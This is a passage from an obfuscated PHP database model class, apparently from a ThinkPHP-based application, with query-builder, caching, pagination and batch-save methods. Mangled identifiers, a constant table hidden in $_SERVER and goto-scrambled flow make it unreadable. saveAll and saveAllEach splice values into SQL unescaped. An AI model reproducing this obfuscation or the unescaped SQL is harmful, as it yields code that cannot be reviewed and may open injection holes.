$f½«„ÒÅÌó = get_object_vars($f½«„ÒÅÌó); } if (is_string($f½«„ÒÅÌó)) { $dº¾Ü´œ‘Š = $f½«„ÒÅÌó; } elseif (is_array($f½«„ÒÅÌó)) { if (isset($f½«„ÒÅÌó[0])) { $this->options[$d„ÖæÁ ¯•[346]] = array_merge($this->options[$d„ÖæÁ ¯•[346]], $f½«„ÒÅÌó); return $this; } else { $dº¾Ü´œ‘Š = $f½«„ÒÅÌó; } } else { think_exception(think_lang($d„ÖæÁ ¯•[270])); } $this->options[$d„ÖæÁ ¯•[346]][] = $dº¾Ü´œ‘Š; goto a¢ÎàÏˆÔñ; a¢ÎàÏˆÔñ: return $this; goto f¯«½¢ºó·; C‘²é÷¼ ß: $d„ÖæÁ ¯• =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($f½«„ÒÅÌó)) { return $this; } if ($DÓªïŒŠó¬) { $this->options[$d„ÖæÁ ¯•[346]][$d„ÖæÁ ¯•[347]] = !0; } goto eÓ…ƒòƒ§¥; f¯«½¢ºó·: } public function cache($EµÅÆ†ïÉ± = true, $C´®¨í—ö = null, $fÜÒè„‘¼Í = '') { $cÕì©ÕŠ· =& $_SERVER[°Óó£ÌİóèÅ]; if (!1 !== $EµÅÆ†ïÉ±) { $this->options[$cÕì©ÕŠ·[348]] = array($cÕì©ÕŠ·[96] => $EµÅÆ†ïÉ±, $cÕì©ÕŠ·[338] => $C´®¨í—ö, $cÕì©ÕŠ·[29] => $fÜÒè„‘¼Í); } return $this; } public function field($DÀÛŞèïì, $cí×÷óë´í = false) { $DÍÌ÷¸‚ã× =& $_SERVER[°Óó£ÌİóèÅ]; if (!0 === $DÀÛŞèïì) { $cŞ¬¶ŞÍ¼× = $this->getDbFields(); $DÀÛŞèïì = $cŞ¬¶ŞÍ¼× ? $cŞ¬¶ŞÍ¼× : $DÍÌ÷¸‚ã×[181]; } elseif ($cí×÷óë´í) { if (is_string($DÀÛŞèïì)) { $DÀÛŞèïì = explode($DÍÌ÷¸‚ã×[47], $DÀÛŞèïì); } $cŞ¬¶ŞÍ¼× = $this->getDbFields(); $DÀÛŞèïì = $cŞ¬¶ŞÍ¼× ? array_diff($cŞ¬¶ŞÍ¼×, $DÀÛŞèïì) : $DÀÛŞèïì; } $this->options[$DÍÌ÷¸‚ã×[272]] = $DÀÛŞèïì; return $this; } public function scope($a°Å°­ÆƒÍ = '', $BÊ“Úâ‘²¹ = NULL) { $b¶—Ò”¯âÙ =& $_SERVER[°Óó£ÌİóèÅ]; if ($b¶—Ò”¯âÙ[33] === $a°Å°­ÆƒÍ) { if (isset($this->_scope[$b¶—Ò”¯âÙ[34]])) { $bªÉŠ¹ì = $this->_scope[$b¶—Ò”¯âÙ[34]]; } else { return $this; } } elseif (is_string($a°Å°­ÆƒÍ)) { $bæÒ©Ã›› = explode($b¶—Ò”¯âÙ[47], $a°Å°­ÆƒÍ); $bªÉŠ¹ì = array(); foreach ($bæÒ©Ã›› as $cç¹™íŠ›è) { if (!isset($this->_scope[$cç¹™íŠ›è])) { continue; } $bªÉŠ¹ì = array_merge($bªÉŠ¹ì, $this->_scope[$cç¹™íŠ›è]); } if (!empty($BÊ“Úâ‘²¹) && is_array($BÊ“Úâ‘²¹)) { $bªÉŠ¹ì = array_merge($bªÉŠ¹ì, $BÊ“Úâ‘²¹); } } elseif (is_array($a°Å°­ÆƒÍ)) { $bªÉŠ¹ì = $a°Å°­ÆƒÍ; } if (is_array($bªÉŠ¹ì) && !empty($bªÉŠ¹ì)) { $this->options = array_merge($this->options, array_change_key_case($bªÉŠ¹ì)); } return $this; } public function where($CùÕ‰¨øñç, $BİŞ‹•“¼İ = null) { $eÉÉİİ³—¾ =& $_SERVER[°Óó£ÌİóèÅ]; if (!is_null($BİŞ‹•“¼İ) && is_string($CùÕ‰¨øñç)) { if (!is_array($BİŞ‹•“¼İ)) { $BİŞ‹•“¼İ = func_get_args(); array_shift($BİŞ‹•“¼İ); } $BİŞ‹•“¼İ = array_map(array($this->db, $eÉÉİİ³—¾[342]), $BİŞ‹•“¼İ); $CùÕ‰¨øñç = vsprintf($CùÕ‰¨øñç, $BİŞ‹•“¼İ); } elseif (is_object($CùÕ‰¨øñç)) { $CùÕ‰¨øñç = get_object_vars($CùÕ‰¨øñç); } if (is_string($CùÕ‰¨øñç) && $eÉÉİİ³—¾[33] != $CùÕ‰¨øñç) { $D¡ôîÑ½é = array(); $D¡ôîÑ½é[$eÉÉİİ³—¾[349]] = $CùÕ‰¨øñç; $CùÕ‰¨øñç = $D¡ôîÑ½é; } if (isset($this->options[$eÉÉİİ³—¾[274]])) { $this->options[$eÉÉİİ³—¾[274]] = array_merge($this->options[$eÉÉİİ³—¾[274]], $CùÕ‰¨øñç); } else { $this->options[$eÉÉİİ³—¾[274]] = $CùÕ‰¨øñç; } return $this; } public function limit($A¿Ã¸æ¥ñ«, $AÉ«¨°Æä’ = null) { $a¹‚Ò¼ˆ¾ç =& $_SERVER[°Óó£ÌİóèÅ]; $this->options[$a¹‚Ò¼ˆ¾ç[291]] = is_null($AÉ«¨°Æä’) ? $A¿Ã¸æ¥ñ« : $A¿Ã¸æ¥ñ« . $a¹‚Ò¼ˆ¾ç[47] . $AÉ«¨°Æä’; return $this; } public function page($DÙ£¥¤ö–º, $CÄÃ¶ò²Ğ = null) { $f„êİİ—» =& $_SERVER[°Óó£ÌİóèÅ]; $this->options[$f„êİİ—»[350]] = is_null($CÄÃ¶ò²Ğ) ? $DÙ£¥¤ö–º : $DÙ£¥¤ö–º . $f„êİİ—»[47] . $CÄÃ¶ò²Ğ; return $this; } public function comment($BÜ¾À¢·õ) { $this->options[$_SERVER[°Óó£ÌİóèÅ][351]] = $BÜ¾À¢·õ; return $this; } public function setProperty($CÜßÕ¾ùî, $cÉ„â™Ş‘) { if (property_exists($this, $CÜßÕ¾ùî)) { $this->{$CÜßÕ¾ùî} = $cÉ„â™Ş‘; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\124\x69\x6d\145", "\x74\151\x6d\145", "\151\x6e\x73\x65\162\164\54\165\x70\x64\141\x74\145", "\146\165\x6e\x63\164\151\x6f\156"), array("\143\162\145\141\164\145\x54\151\155\145", "\x74\x69\155\145", "\x69\x6e\163\x65\162\x74", "\x66\165\x6e\x63\164\151\157\156")); public function setDataAuto($fÔÓ·Ä‡¥¯) { $this->dataAuto = $fÔÓ·Ä‡¥¯; } public function __construct($FÂÃÜœÉğõ = '', $Aƒâ™‹Æ™İ = '', $Eìº”øÁ°ì = '') { parent::__construct($FÂÃÜœÉğõ, $Aƒâ™‹Æ™İ, $Eìº”øÁ°ì); } static function textEncode($BÄÊ²ùÆ×ä) { $eÂ‰ìğÕµ¸ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$BÄÊ²ùÆ×ä) { return $eÂ‰ìğÕµ¸[33]; } $C ­éÜ‚ä’ = json_encode($BÄÊ²ùÆ×ä); $C ­éÜ‚ä’ = preg_replace_callback($eÂ‰ìğÕµ¸[352], function ($CºÄµ¸¹ĞÅ) { return addslashes($CºÄµ¸¹ĞÅ[0]); }, $C ­éÜ‚ä’); return json_decode($C ­éÜ‚ä’); } static function textDecode($AÉˆæöŒŠ«) { $C”Ì—£°òâ =& $_SERVER[°Óó£ÌİóèÅ]; $dÁÖí¸„‘ = json_encode($AÉˆæöŒŠ«); $dÁÖí¸„‘ = preg_replace_callback($C”Ì—£°òâ[353], function ($aÙ‰²©î‘) { return $_SERVER[°Óó£ÌİóèÅ][102]; }, $dÁÖí¸„‘); return json_decode($dÁÖí¸„‘); } protected $tableMeta = array(); protected function _beforeInsert(&$D±éãÖÏ°ó, $DƒÔ¿‚¨¡) { $dõ®Ô¼Ÿ˜ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->checkDataAutoHas($dõ®Ô¼Ÿ˜[354])) { return; } $this->dataBeforeFilter($D±éãÖÏ°ó, $dõ®Ô¼Ÿ˜[354]); } protected function _beforeUpdate(&$bõ¡Àˆ°ó, $FÉÍòŒ’ù…) { $d×äËã¹ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->checkDataAutoHas($d×äËã¹[355])) { return; } $this->dataBeforeFilter($bõ¡Àˆ°ó, $d×äËã¹[355]); } protected function _afterSelect(&$A¬ÖÁÕ—Ç§, $C÷ÃÁ’•¢š) { if (!is_array($A¬ÖÁÕ—Ç§)) { return; } if (!$this->checkDataAutoHas($_SERVER[°Óó£ÌİóèÅ][356])) { return; } foreach ($A¬ÖÁÕ—Ç§ as &$D™ÇÄ¡àµÒ) { $this->dataAfterFilter($D™ÇÄ¡àµÒ); } } protected function _afterFind(&$a¯ïó•ÆÍ, $AŸºŠˆßó) { if (!is_array($a¯ïó•ÆÍ)) { return; } if (!$this->checkDataAutoHas($_SERVER[°Óó£ÌİóèÅ][356])) { return; } $this->dataAfterFilter($a¯ïó•ÆÍ); } public function setAutoIncrement($aìóä•ÍÚø) { $a‹Å·ØÇ‰¿ = array($this->getPk() => $aìóä•ÍÚø); $EåÈºÊÎÎ = $this->data($a‹Å·ØÇ‰¿)->add(); if ($EåÈºÊÎÎ) { $this->delete($EåÈºÊÎÎ); } } public function getAutoIncrement() { $D—²¶Ó›‘’ = $this->getTableName(); $C£ŸŞİé‡Œ = $this->max($this->getPk()); $dôæ”ó² = $this->query("\x73\x68\157\x77\40\164\x61\x62\x6c\x65\x20\x73\x74\141\x74\x75\x73\40\x77\x68\x65\162\x65\40\116\x61\x6d\145\75\47{$D—²¶Ó›‘’}\x27"); $b“ã¸ÖÆ— = $dôæ”ó²[0][$_SERVER[°Óó£ÌİóèÅ][357]]; $a‰èæî°òÉ = max($C£ŸŞİé‡Œ, $b“ã¸ÖÆ—); return $a‰èæî°òÉ; } protected function _callBefore($a˜ĞÖŒèã, $bµ•àİËá¬) { return $this->cacheCallCheck($a˜ĞÖŒèã, $bµ•àİËá¬, !1); } protected function _callAfter($Bˆêé§ÜĞŒ, $aÎ…ËÌŸÒ§) { return $this->cacheCallCheck($Bˆêé§ÜĞŒ, $aÎ…ËÌŸÒ§, !0); } protected function cacheFunctionAlias($a›É¾Ë†˜î) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b¦©×óƒø, $dÕ«¿‰İ, $fä ÖÓŒË½ = false) { $BèÛÏêÂ = $this->cacheFunctionAlias($dÕ«¿‰İ); if (!$BèÛÏêÂ) { return; } foreach ($BèÛÏêÂ as $Bˆƒ¥Ô¾‡Ü => $FÃº½§¦ƒŠ) { $D¨ÍÜáèáÔ = $FÃº½§¦ƒŠ[0]; $déÇ‚–ÚŸ = explode($_SERVER[°Óó£ÌİóèÅ][47], $FÃº½§¦ƒŠ[1]); if ($b¦©×óƒø == $Bˆƒ¥Ô¾‡Ü) { return $this->cacheFunctionGet($Bˆƒ¥Ô¾‡Ü, $D¨ÍÜáèáÔ); } if ($fä ÖÓŒË½ && in_array($b¦©×óƒø, $déÇ‚–ÚŸ)) { $this->cacheFunctionClear($Bˆƒ¥Ô¾‡Ü, $D¨ÍÜáèáÔ); } } } public function cacheFunctionGet($AÂäÕµÈÜ¡, $Däö¶ßõÚó) { $a„Æéà² Â = $this->cacheKeyMake($AÂäÕµÈÜ¡, $Däö¶ßõÚó); $d’Æß‘Ì–  = Cache::get($a„Æéà² Â); if (!is_array($d’Æß‘Ì– )) { $d’Æß‘Ì–  = call_user_func_array(array($this, $AÂäÕµÈÜ¡), array($Däö¶ßõÚó, !0)); Cache::set($a„Æéà² Â, $d’Æß‘Ì– ); } return $d’Æß‘Ì– ; } public function cacheFunctionClear($E¹·‹“¸½é, $DßğšàöÑ) { $E²¢îŠ¦†Ü = $DßğšàöÑ; if (!is_array($DßğšàöÑ)) { $E²¢îŠ¦†Ü = array($DßğšàöÑ); } foreach ($E²¢îŠ¦†Ü as $EÕ¹çŸÉ‚ß) { $eòƒ¿Á‡Á® = $this->cacheKeyMake($E¹·‹“¸½é, $EÕ¹çŸÉ‚ß); Cache::remove($eòƒ¿Á‡Á®); } } private function cacheKeyMake($CäîèºãÆ», $E×ë…‚õ) { $fÀˆ±©ğùô =& $_SERVER[°Óó£ÌİóèÅ]; return get_class($this) . $fÀˆ±©ğùô[79] . $CäîèºãÆ» . $fÀˆ±©ğùô[358] . $E×ë…‚õ; } protected function selectPage($C›‰ã¶š¥ = 200, $aª²œ®—ìƒ = 1) { goto dƒÆ½ê¦îº; dÄ®ğß†Ñ: $dÈÏÍ±¤Ò– = $F”¿ª²ºÍ; $dÈÏÍ±¤Ò–[$b¸·åëãêğ[360]] = array(); $this->optionsValue($dÈÏÍ±¤Ò–); goto D£°Ïõã; cÙªÎ¤·„Ü: $FÍç·ğŒ­ = ceil($cÑˆŠˆ§õÜ / $C›‰ã¶š¥); $aª²œ®—ìƒ = intval(isset($in[$b¸·åëãêğ[350]]) ? $in[$b¸·åëãêğ[350]] : $aª²œ®—ìƒ); $aª²œ®—ìƒ = $aª²œ®—ìƒ <= 1 ? 1 : ($aª²œ®—ìƒ >= $FÍç·ğŒ­ ? $FÍç·ğŒ­ : $aª²œ®—ìƒ); goto AÄ×’ƒëÊŒ; Dù„Ú³Šˆæ: $F‚‰„·™™© = 4000; $C›‰ã¶š¥ = isset($in[$b¸·åëãêğ[359]]) ? $in[$b¸·åëãêğ[359]] : $C›‰ã¶š¥; if ($C›‰ã¶š¥ === -1) { unset($in[$b¸·åëãêğ[359]]); $F‚‰„·™™© = 100000000; $C›‰ã¶š¥ = $F‚‰„·™™©; } goto dÄ®ğß†Ñ; D£°Ïõã: $cÑˆŠˆ§õÜ = intval($this->count()); $C›‰ã¶š¥ = intval($C›‰ã¶š¥); $C›‰ã¶š¥ = $C›‰ã¶š¥ <= 5 ? 5 : ($C›‰ã¶š¥ >= $F‚‰„·™™© ? $F‚‰„·™™© : $C›‰ã¶š¥); goto cÙªÎ¤·„Ü; dƒÆ½ê¦îº: $b¸·åëãêğ =& $_SERVER[°Óó£ÌİóèÅ]; global $in; $F”¿ª²ºÍ = $this->optionsValue(); goto Dù„Ú³Šˆæ; AÄ×’ƒëÊŒ: $this->optionsValue($F”¿ª²ºÍ); $e¯õ–¯•¹ = $this->page($aª²œ®—ìƒ, $C›‰ã¶š¥)->select(); if ($FÍç·ğŒ­ == 1) { $cÑˆŠˆ§õÜ = count($e¯õ–¯•¹); } goto C—ÊˆĞ¯ØŠ; C—ÊˆĞ¯ØŠ: $fÊ‡áÁ„Ô = array($b¸·åëãêğ[361] => array($b¸·åëãêğ[362] => $cÑˆŠˆ§õÜ, $b¸·åëãêğ[359] => $C›‰ã¶š¥, $b¸·åëãêğ[350] => $aª²œ®—ìƒ, $b¸·åëãêğ[363] => $FÍç·ğŒ­), $b¸·åëãêğ[364] => $e¯õ–¯•¹ ? $e¯õ–¯•¹ : array()); return $fÊ‡áÁ„Ô; goto f»Ú½¨£Ñ°; f»Ú½¨£Ñ°: } protected function metaSet($cÑÒâôÕÓ, $aİ¦–Ú£“­ = null, $AÏ™Ÿ¢Ã· = null) { goto e¯ã§‘™‰; e¯ã§‘™‰: $c¤ŞæìÌ‡ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->tableMeta) { return !1; } $e÷¤¸ÍøŒ = $this->tableMeta[$c¤ŞæìÌ‡[365]]; goto cŞø‰¬†È; cŞø‰¬†È: $cÚ¢¶…‘´ß = Model($this->tableMeta[$c¤ŞæìÌ‡[366]]); if (is_array($aİ¦–Ú£“­)) { $fÏö»ùçÏ¿ = array(); foreach ($aİ¦–Ú£“­ as $Aííò‹Æ¸ó => $cÀÃˆš‰Ş†) { $fÏö»ùçÏ¿[] = array($e÷¤¸ÍøŒ => $cÑÒâôÕÓ, $c¤ŞæìÌ‡[96] => $Aííò‹Æ¸ó, $c¤ŞæìÌ‡[367] => $cÀÃˆš‰Ş†); } $cÚ¢¶…‘´ß->where(array($e÷¤¸ÍøŒ => $cÑÒâôÕÓ))->addAll($fÏö»ùçÏ¿, array(), !0); return !0; } $E¦ôğšè = array($e÷¤¸ÍøŒ => $cÑÒâôÕÓ, $c¤ŞæìÌ‡[368] => $aİ¦–Ú£“­); goto aÖ¦ÚÔğ›³; aÖ¦ÚÔğ›³: if (is_null($aİ¦–Ú£“­)) { return $cÚ¢¶…‘´ß->where(array($e÷¤¸ÍøŒ => $cÑÒâôÕÓ))->delete(); } if (is_null($AÏ™Ÿ¢Ã·)) { return $cÚ¢¶…‘´ß->where($E¦ôğšè)->delete(); } $d„ÕÌ¶Üòß = !1; goto Bâˆù³¬ÑÃ; Bâˆù³¬ÑÃ: if ($cÚ¢¶…‘´ß->where($E¦ôğšè)->find()) { $d„ÕÌ¶Üòß = $cÚ¢¶…‘´ß->where($E¦ôğšè)->save(array($c¤ŞæìÌ‡[369] => $AÏ™Ÿ¢Ã·)); } else { $E¦ôğšè[$c¤ŞæìÌ‡[367]] = $AÏ™Ÿ¢Ã·; $d„ÕÌ¶Üòß = $cÚ¢¶…‘´ß->add($E¦ôğšè); } return $d„ÕÌ¶Üòß; goto dÕ÷¥ºÄšê; dÕ÷¥ºÄšê: } public function metaGet($Bõ¯ğ¾Ï) { goto DœçÂùµœ™; c³âé‰à¦: $DğõİÉĞŒ‡ = array_to_keyvalue($DğõİÉĞŒ‡, $D¶ùÉöìéÔ[96], $D¶ùÉöìéÔ[367]); return $DğõİÉĞŒ‡; goto d¢Œ›…§Ê; fìùÓ˜Åæ‘: $c‚»ĞŞÃºƒ = Model($this->tableMeta[$D¶ùÉöìéÔ[366]]); $A¾Áµ¨œ¶ = array($aœŠ¦¬šÛ => $Bõ¯ğ¾Ï); $DğõİÉĞŒ‡ = $c‚»ĞŞÃºƒ->field($D¶ùÉöìéÔ[370])->where($A¾Áµ¨œ¶)->select(); goto c³âé‰à¦; DœçÂùµœ™: $D¶ùÉöìéÔ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->tableMeta) { return array(); } $aœŠ¦¬šÛ = $this->tableMeta[$D¶ùÉöìéÔ[365]]; goto fìùÓ˜Åæ‘; d¢Œ›…§Ê: } private function checkDataAutoHas($CßÊæ½Œ“¤) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $D¹è·´ƒ¶) { if (in_array($CßÊæ½Œ“¤, explode($_SERVER[°Óó£ÌİóèÅ][47], $D¹è·´ƒ¶[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$dˆšŒƒ²¹, $bœ¿Äø¸ç) { $fíÉ¨Ë‰İ“ =& $_SERVER[°Óó£ÌİóèÅ]; foreach ($this->dataAuto as $b¯çì¤·ì) { $e›‚éÙ° = $b¯çì¤·ì[0]; if (!in_array($bœ¿Äø¸ç, explode($fíÉ¨Ë‰İ“[47], $b¯çì¤·ì[2]))) { continue; } switch (trim($b¯çì¤·ì[3])) { case $fíÉ¨Ë‰İ“[320]: case $fíÉ¨Ë‰İ“[321]: $A¾ŸÓØ–£Ú = $b¯çì¤·ì[1]; $dŒË™Ò£ö‚ = isset($b¯çì¤·ì[4]) ? (array) $b¯çì¤·ì[4] : array(); if ($A¾ŸÓØ–£Ú == $fíÉ¨Ë‰İ“[198] && array_key_exists($e›‚éÙ°, $dˆšŒƒ²¹)) { if (!$dˆšŒƒ²¹[$e›‚éÙ°]) { unset($dˆšŒƒ²¹[$e›‚éÙ°]); } break; } if (isset($dˆšŒƒ²¹[$e›‚éÙ°])) { array_unshift($dŒË™Ò£ö‚, $dˆšŒƒ²¹[$e›‚éÙ°]); } if ($fíÉ¨Ë‰İ“[320] == $b¯çì¤·ì[3]) { $dˆšŒƒ²¹[$e›‚éÙ°] = call_user_func_array($A¾ŸÓØ–£Ú, $dŒË™Ò£ö‚); } else { $dˆšŒƒ²¹[$e›‚éÙ°] = call_user_func_array(array(&$this, $A¾ŸÓØ–£Ú), $dŒË™Ò£ö‚); } break; case $fíÉ¨Ë‰İ“[272]: $dˆšŒƒ²¹[$e›‚éÙ°] = $dˆšŒƒ²¹[$b¯çì¤·ì[1]]; break; case $fíÉ¨Ë‰İ“[293]: if (isset($dˆšŒƒ²¹[$e›‚éÙ°]) && !is_string($dˆšŒƒ²¹[$e›‚éÙ°])) { $dˆšŒƒ²¹[$e›‚éÙ°] = json_encode_force($dˆšŒƒ²¹[$e›‚éÙ°]); } break; case $fíÉ¨Ë‰İ“[322]: if ($dˆšŒƒ²¹[$e›‚éÙ°] === $fíÉ¨Ë‰İ“[33]) { unset($dˆšŒƒ²¹[$e›‚éÙ°]); } break; case $fíÉ¨Ë‰İ“[323]: $dˆšŒƒ²¹[$e›‚éÙ°] = $b¯çì¤·ì[1]; default: break; } } if ($bœ¿Äø¸ç == $fíÉ¨Ë‰İ“[354]) { $aİÈ…¤¶ = strtolower($this->db->getDbType()); if (strpos($aİÈ…¤¶, $fíÉ¨Ë‰İ“[9]) !== 0) { return; } $eñª·Î†„— = $this->field(!0)->fields; $A­ëˆÃ¦›î = $eñª·Î†„—[$fíÉ¨Ë‰İ“[251]]; if (isset($eñª·Î†„—[$fíÉ¨Ë‰İ“[250]])) { unset($A­ëˆÃ¦›î[$eñª·Î†„—[$fíÉ¨Ë‰İ“[250]]]); } foreach ($A­ëˆÃ¦›î as $fĞ«°Îš => $bœ¿Äø¸ç) { if (!isset($dˆšŒƒ²¹[$fĞ«°Îš])) { $dˆšŒƒ²¹[$fĞ«°Îš] = $fíÉ¨Ë‰İ“[33]; } } } } private function dataAfterFilter(&$CÖäµÇîÈÍ) { $däà„–œ¶ =& $_SERVER[°Óó£ÌİóèÅ]; foreach ($this->dataAuto as $EÜÖÏ¤„¾“) { $E´¹¢™¾… = $EÜÖÏ¤„¾“[0]; if (!in_array($däà„–œ¶[356], explode($däà„–œ¶[47], $EÜÖÏ¤„¾“[2]))) { continue; } if (!isset($CÖäµÇîÈÍ[$E´¹¢™¾…])) { continue; } switch (trim($EÜÖÏ¤„¾“[3])) { case $däà„–œ¶[320]: case $däà„–œ¶[321]: $dÜÍÖŠ¿ß¼ = isset($EÜÖÏ¤„¾“[4]) ? (array) $EÜÖÏ¤„¾“[4] : array(); array_unshift($dÜÍÖŠ¿ß¼, $CÖäµÇîÈÍ[$E´¹¢™¾…]); if ($däà„–œ¶[320] == $EÜÖÏ¤„¾“[3]) { $CÖäµÇîÈÍ[$E´¹¢™¾…] = call_user_func_array($EÜÖÏ¤„¾“[1], $dÜÍÖŠ¿ß¼); } else { $CÖäµÇîÈÍ[$E´¹¢™¾…] = call_user_func_array(array(&$this, $EÜÖÏ¤„¾“[1]), $dÜÍÖŠ¿ß¼); } break; case $däà„–œ¶[272]: $CÖäµÇîÈÍ[$E´¹¢™¾…] = $CÖäµÇîÈÍ[$EÜÖÏ¤„¾“[1]]; break; case $däà„–œ¶[293]: $Bñƒïƒ†ê¨ = $CÖäµÇîÈÍ[$E´¹¢™¾…]; $CÖäµÇîÈÍ[$E´¹¢™¾…] = json_decode($Bñƒïƒ†ê¨, !0); if (is_null($CÖäµÇîÈÍ[$E´¹¢™¾…])) { $CÖäµÇîÈÍ[$E´¹¢™¾…] = $Bñƒïƒ†ê¨; } break; case $däà„–œ¶[322]: if ($CÖäµÇîÈÍ[$E´¹¢™¾…] === $däà„–œ¶[33]) { unset($CÖäµÇîÈÍ[$E´¹¢™¾…]); } break; case $däà„–œ¶[323]: $CÖäµÇîÈÍ[$E´¹¢™¾…] = $EÜÖÏ¤„¾“[1]; default: break; } } } public function saveAll($f¨ËÃ‰á´) { goto CÍœÀæ•Ü«; CÍœÀæ•Ü«: $BÂª¢‰âòô =& $_SERVER[°Óó£ÌİóèÅ]; $d‡Š©ğÅÔÍ = $this->tablePrefix . $this->tableName; $fÍÕè’ß§ = self::SQL_WHERE_IN_CHUNK; goto bæÒ¸¦óˆâ; bæÒ¸¦óˆâ: $dãïæ‹ã«‘ = $BÂª¢‰âòô[371]; $CÔÚ¯Ü„ = 0; $D—”Ü«•Åœ = array(); goto Cå§«¢šÈÖ; Cå§«¢šÈÖ: $b›ÆŠøÆ‰ = count($f¨ËÃ‰á´); for ($dä‘œßŠçŞ = 0; $dä‘œßŠçŞ < $b›ÆŠøÆ‰; $dä‘œßŠçŞ++) { $Få„†é–° = $f¨ËÃ‰á´[$dä‘œßŠçŞ]; if (!is_array($Få„†é–°) || count($Få„†é–°) != 4) { continue; } $BçÒï¶…‰ò = "\x55\x50\104\x41\124\105\40{$d‡Š©ğÅÔÍ}\x20\x53\105\124\x20{$Få„†é–°[2]}\40\x3d\x20\103\x41\x53\x45\x20{$Få„†é–°[0]}\40\12"; if ($CÔÚ¯Ü„ == 0) { $dãïæ‹ã«‘ = $BçÒï¶…‰ò; } $D—”Ü«•Åœ[] = $BÂª¢‰âòô[120] . $Få„†é–°[1] . $BÂª¢‰âòô[120]; $CÔÚ¯Ü„++; $dãïæ‹ã«‘ .= "\x20\127\110\105\x4e\40\x27{$Få„†é–°[1]}\x27\40\124\x48\105\116\40\x27{$Få„†é–°[3]}\47\x20\xa"; if ($CÔÚ¯Ü„ == $fÍÕè’ß§ || $dä‘œßŠçŞ == $b›ÆŠøÆ‰ - 1) { $AŒõ›°¦Á­ = implode($BÂª¢‰âòô[47], $D—”Ü«•Åœ); $dãïæ‹ã«‘ .= "\x20\x45\116\x44\40\x20\x57\x48\105\x52\105\x20{$Få„†é–°[0]}\x20\111\x4e\40\x28{$AŒõ›°¦Á­}\x29\x20"; $this->execute($dãïæ‹ã«‘); $CÔÚ¯Ü„ = 0; $dãïæ‹ã«‘ = $BçÒï¶…‰ò; $D—”Ü«•Åœ = array(); } } goto Bò‰´Ü¬ëÕ; Bò‰´Ü¬ëÕ: } public function saveAllEach($dÕÇ¾ÒÌ·) { $Eù„Ò¨æÛ =& $_SERVER[°Óó£ÌİóèÅ]; $F‰šœ¶«Şæ = $this->tablePrefix . $this->tableName; foreach ($dÕÇ¾ÒÌ· as $Dùèš‚ÉŞ„) { if (!is_array($Dùèš‚ÉŞ„) || count($Dùèš‚ÉŞ„) != 4) { continue; } $Cµ·­Ÿ¹® = $Dùèš‚ÉŞ„[0] . $Eù„Ò¨æÛ[372] . $Dùèš‚ÉŞ„[1] . $Eù„Ò¨æÛ[120]; $b§‘ÅäÔ³ = $Dùèš‚ÉŞ„[2] . $Eù„Ò¨æÛ[372] . $Dùèš‚ÉŞ„[3] . $Eù„Ò¨æÛ[120]; $b¿ŒĞØ‹ãğ = "\165\160\x64\141\x74\x65\40{$F‰šœ¶«Şæ}\40\x73\x65\164\x20{$b§‘ÅäÔ³}\x20\x77\x68\x65\162\145\40{$Cµ·­Ÿ¹®}\73"; $this->execute($b¿ŒĞØ‹ãğ); } } public function addAll($E®¦ Ô¾’ö, $CÁ÷¨›•ÖÒ = array(), $cÆ¨‰£ç‡Ï = false) { goto F»°ëö×†›; fç…ƒ‘š®: if (empty($E®¦ Ô¾’ö)) { $this->error = think_lang($Fèå¿æœ˜ó[270]); return !1; } $CÁ÷¨›•ÖÒ = $this->_parseOptions($CÁ÷¨›•ÖÒ); foreach ($E®¦ Ô¾’ö as $fñ¾Ç‚ËÌ‡ => $aÅ¨Ö©áä) { $E®¦ Ô¾’ö[$fñ¾Ç‚ËÌ‡] = $this->_facade($aÅ¨Ö©áä); $this->_beforeInsert($E®¦ Ô¾’ö[$fñ¾Ç‚ËÌ‡], $CÁ÷¨›•ÖÒ); } goto FÒéáƒŒÎ; F»°ëö×†›: $Fèå¿æœ˜ó =& $_SERVER[°Óó£ÌİóèÅ]; ignore_timeout(); $b¹Şé‹ƒó = self::SQL_WHERE_IN_CHUNK; goto fç…ƒ‘š®; FÒéáƒŒÎ: if (method_exists($this->db, $Fèå¿æœ˜ó[271])) { for ($fˆîˆí‚£‰ = 0; $fˆîˆí‚£‰ < count($E®¦ Ô¾’ö); $fˆîˆí‚£‰ += $b¹Şé‹ƒó) { $Cê±ĞòÑ† = array_slice($E®¦ Ô¾’ö, $fˆîˆí‚£‰, $b¹Şé‹ƒó); if (!is_array($Cê±ĞòÑ†) || count($Cê±ĞòÑ†) == 0) { break; } $b‚ “˜Ù¥é = $this->db->insertAll($Cê±ĞòÑ†, $CÁ÷¨›•ÖÒ, $cÆ¨‰£ç‡Ï); } } else { $this->startTrans(); foreach ($E®¦ Ô¾’ö as $fñ¾Ç‚ËÌ‡ => $aÅ¨Ö©áä) { $b‚ “˜Ù¥é = $this->db->insert($aÅ¨Ö©áä, $CÁ÷¨›•ÖÒ, $cÆ¨‰£ç‡Ï); } $this->commit(); } if (!1 !== $b‚ “˜Ù¥é) { $DäÂ±çäáİ = $this->getLastInsID(); if ($DäÂ±çäáİ) { return $DäÂ±çäáİ; } } return $b‚ “˜Ù¥é; goto cË”•À·Í; cË”•À·Í: } public function save($aæŠñ‚À¦ä = '', $EÃ—ÈÔƒâ = array()) { goto CéºÂÒˆ¬; AÖœ§Œ£ëæ: $bÃœîì†öÁ = $f¸‰¨’çÆ[$c¥·šŸøï³[274]][$BÕÔ·´‚„Ú][1]; $bĞÂº¡ºËƒ = count($bÃœîì†öÁ); for ($døãÙÁîË = 0; $døãÙÁîË < $bĞÂº¡ºËƒ; $døãÙÁîË += $D³¨–áÑÔã) { $BÌ†ˆˆà™ = array_slice($bÃœîì†öÁ, $døãÙÁîË, $D³¨–áÑÔã); if (!is_array($BÌ†ˆˆà™) || count($BÌ†ˆˆà™) == 0) { break; } $f¸‰¨’çÆ[$c¥·šŸøï³[274]][$BÕÔ·´‚„Ú][1] = $BÌ†ˆˆà™; $this->optionsValue($f¸‰¨’çÆ); $d¼ìµÌÂïÔ += parent::save($aæŠñ‚À¦ä, $EÃ—ÈÔƒâ); } goto 